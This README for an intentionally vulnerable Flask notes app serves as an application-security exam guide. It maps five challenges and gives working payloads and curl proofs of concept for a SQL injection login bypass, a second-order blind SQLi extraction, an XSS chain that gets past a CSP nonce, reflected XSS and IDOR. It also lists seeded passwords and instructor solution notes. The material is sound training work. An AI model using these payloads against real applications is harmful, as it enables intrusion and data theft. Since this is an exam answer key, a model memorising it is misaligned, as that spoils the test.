# Notes App — Vulnerable Flask App
### Application Security Practical Exam

> **DO NOT deploy on a public network. For lab use only.**

---

## Quick start

```bash
# 1. Create virtualenv
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

# 2. Install pinned dependencies
pip install -r requirements.txt

# 3. Seed the database
python db.py

# 4. Run
python app.py
# → http://127.0.0.1:5000
```

---

## Seeded accounts

| Username | Password | Role |
|----------|----------|------|
| admin | *(extract via blind SQLi — challenge 2)* | admin |
| alice | alice123 | user |
| bob | bob456 | user |

---

## Security controls in place

These defences are intentionally applied to raise the bar. Understanding *why* they don't fully stop the attacks is part of the challenge.

| Control | Where | What it stops |
|---------|-------|---------------|
| Parameterised queries | `/register`, `/check-user` step 1 | Direct SQLi on those inputs |
| `HttpOnly` session cookie | All routes | `document.cookie` theft via XSS |
| `SameSite=Lax` cookie | All routes | Cross-site POST request forgery |
| Content Security Policy (nonce) | All routes | Direct `<script>` / event-handler injection in stored XSS |

---

## Vulnerability map

### [1] SQL Injection — `POST /login`
- **Difficulty:** Easy (warmup)
- **Mechanism:** Username and password are interpolated directly into a raw f-string query; no parameterisation.
- **Payload:**
  ```
  username: admin'--
  password: anything
  ```
  `--` comments out the password check, logging in as admin unconditionally.
- **Flag:** shown in the Admin Panel on `/dashboard` after bypass.

---

### [2] Second-Order Blind SQLi — `GET /check-user`
- **Difficulty:** Medium
- **Mechanism:** `POST /register` is correctly parameterised — the payload is stored verbatim in the DB.
  `GET /check-user` does a **safe lookup first**, then trusts the returned DB value and drops it raw
  into a second `COUNT(*)` query. The developer assumed DB-stored data was already safe.
- **Attack flow:**
  1. Register a user whose **username is the SQL injection payload** (stored literally by the safe INSERT).
  2. Call `/check-user?username=<that_exact_username>`.
  3. The safe step-1 query finds the user; step-2 injects the stored username into the raw query.
  4. Read the boolean oracle via a `UNION` that borrows alice's `user_id`:
     - `"has 1 note(s)"` → condition **TRUE**
     - `"has 0 note(s)"` → condition **FALSE**
  5. Extract characters one at a time using `SUBSTR()`.
- **Flag:** admin's password (the string itself is the flag — extract it).

**Manual probe — register this string as your username:**
```
__probe__' UNION SELECT id FROM users WHERE username='alice' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a') AND '1'='1
```
`'1'='1` closes the string safely — `--` cannot be used here because the query template appends `')` after the stored username, which `--` would comment out.

**Automated extraction:**
```bash
python poc_blind_sqli.py http://127.0.0.1:5000
```
The script registers one throwaway user per character test and binary-searches the full DB.

---

### [3] Stored XSS — `POST /notes/new` · `GET /notes/<id>`
- **Difficulty:** Medium
- **Mechanism:** Note content is stored raw and rendered in `view_note.html` with Jinja2's
  `{{ note.content | safe }}` — no server-side sanitisation.
- **CSP in effect:** `script-src 'nonce-{random}'` — direct `<script>` injection and inline
  event handlers (`onerror`, `onload`, etc.) are **blocked** because they carry no nonce.

#### What is blocked by CSP
```html
<script>alert(1)</script>          <!-- no nonce → browser rejects -->
<img src=x onerror="alert(1)">    <!-- no unsafe-inline → blocked -->
<svg onload="alert(1)">           <!-- same -->
```

#### What still works — Stored → Reflected XSS chain

Store a lure link in a note (HTML injection is not blocked by CSP):
```html
<a href="/search?q=%22%3Balert(document.getElementById('flag').textContent)%2F%2F"
   style="color:red;font-weight:bold">Click to claim your reward!</a>
```

When a victim clicks it, they hit `/search` where the query is injected raw inside the
nonce'd `<script>` block. The browser authorised the block — it cannot distinguish injected
code from legitimate code inside it.

Rendered on `/search`:
```javascript
// <script nonce="..."> — CSP passes this block
var searchTerm = "";alert(document.getElementById('flag').textContent)//";
```

**PoC (curl):**
```bash
SESSION=$(curl -si -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123" | grep -o "session=[^;]*")

# Store the lure
curl -X POST http://localhost:5000/notes/new -H "Cookie: $SESSION" \
  --data-urlencode 'title=Free Prize' \
  --data-urlencode 'content=<a href="/search?q=%22%3Balert(document.getElementById(%27flag%27).textContent)%2F%2F">Click to claim!</a>'

# Victim clicks → reflected XSS fires inside nonce'd block
curl -s 'http://localhost:5000/search?q=%22%3Balert(document.getElementById(%27flag%27).textContent)%2F%2F' \
  -H "Cookie: $SESSION" | grep searchTerm
```

- **Flag:** the hidden `<span id="flag">` rendered in `view_note.html` when logged in.

---

### [4] Reflected XSS — `GET /search`
- **Difficulty:** Medium
- **Mechanism:** `{{ query | safe }}` injects the search term raw into a `<script>` block.
  Jinja2 HTML-escapes `{{ query }}` in visible HTML (the `<strong>` tag) — angle brackets are safe there.
  The JS string context is different: no angle brackets needed, just a `"` to break out.
- **CSP note:** The injection is **inside** the nonce'd `<script>` block, so CSP does not block it.
  The nonce authorises the block, not its contents.
- **Prerequisite:** Must be logged in — `<span id="flag">` only renders with an active session.
- **Payload:**
  ```
  /search?q=";alert(document.getElementById('flag').textContent)//
  ```
  Rendered:
  ```javascript
  var searchTerm = "";alert(document.getElementById('flag').textContent)//";
  ```
- **Why `document.cookie` is empty:** The session cookie has `HttpOnly=true` — JS cannot read it.
  The flag element is still accessible via the DOM.

---

### [5] IDOR — `GET /notes/<id>`
- **Difficulty:** Easy (entry point)
- **Mechanism:** No ownership check — query is `WHERE id = ?` only, no `AND user_id = ?`.
  Any authenticated user can read any note by incrementing the integer ID.
- **Exploit:** Log in as alice or bob, then visit `/notes/1`.
- **Flag:** stored as the content of admin's note (id = 1).

---

## Flag summary

| # | Challenge | Endpoint | How to get it |
|---|-----------|----------|---------------|
| 1 | Classic SQLi | `POST /login` | Login bypass, read dashboard |
| 2 | Blind SQLi | `GET /check-user` | Extract admin password from DB |
| 3 | Stored XSS | `GET /notes/<id>` | Stored→reflected chain, read `#flag` |
| 4 | Reflected XSS | `GET /search` | Break JS string, read `#flag` |
| 5 | IDOR | `GET /notes/1` | Read admin's note directly |

---

## PoC tools

| File | Challenge | Purpose |
|------|-----------|---------|
| `poc_blind_sqli.py` | #2 | Registers injection payloads, binary-searches admin password |

```bash
python poc_blind_sqli.py http://127.0.0.1:5000
```

---

## Instructor notes

- Run `python db.py` to reset the database between exam sessions.
- The `poc_blind_sqli.py` script is the intended reference solution for challenge 2.
  Students are expected to understand the two-step injection and write something similar.
- Challenge 3 and 4 require the student to be logged in before `#flag` renders.
- Challenge 3's stored → reflected chain is intentional: it teaches that CSP nonces protect
  *blocks*, not *content inside blocks*. The only real fix is removing `| safe`.
- Students attempting `document.cookie` in XSS payloads will get an empty string — point
  them toward the DOM instead (`document.getElementById('flag').textContent`).
